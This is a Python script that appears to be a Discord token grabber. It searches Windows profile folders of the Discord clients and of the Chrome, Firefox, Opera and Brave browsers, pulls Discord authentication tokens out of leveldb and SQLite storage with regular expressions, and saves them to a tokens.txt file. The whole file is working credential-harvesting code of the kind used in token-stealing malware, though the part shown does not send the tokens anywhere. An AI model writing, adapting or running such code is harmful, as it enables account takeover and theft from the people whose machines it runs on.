import os
import re
import sqlite3

def findTokens(path, firefox=False):
    tokens = []
    
    if (firefox):
        for dirName in os.listdir(path):
            path += "\\" + dirName + "\\storage\\default\\https+++discord.com\\ls\\data.sqlite"
            try:
                con = sqlite3.connect(path)
                cur = con.cursor()
                cur.execute("SELECT * FROM data where key='token'")
                for row in cur.fetchall():
                    tokens.append(row[1][1:-1])
                con.close()
                cur.close()
            except Exception:
                continue
        return tokens
    
    path += "\\Local Storage\\leveldb"

    for fileName in os.listdir(path):
        if not fileName.endswith(".log") and not fileName.endswith(".ldb"):
            continue

        for line in [x.strip() for x in open(f"{path}\\{fileName}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def main():
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")

    paths = {
        "Discord": roaming + "\\Discord",
        "Discord Canary": roaming + "\\discordcanary",
        "Discord PTB": roaming + "\\discordptb",
        "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        "Mozilla Firefox": roaming + "\\Mozilla\\Firefox\\Profiles",
        "Opera": roaming + "\\Opera Software\\Opera Stable",
        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"
    }
    
    text = ""

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        
        tokens = findTokens(path, True) if (platform == "Mozilla Firefox") else findTokens(path)
        
        if len(tokens) > 0:
            text += f"{'#' + ' -- '*5} {platform} {' -- '*5 + '#'}\n"
            for token in tokens:
                text += f"{token}\n"
            text += "\n"

    with open("tokens.txt", "w") as f:
        f.writelines(text)


if __name__ == "__main__":
    main()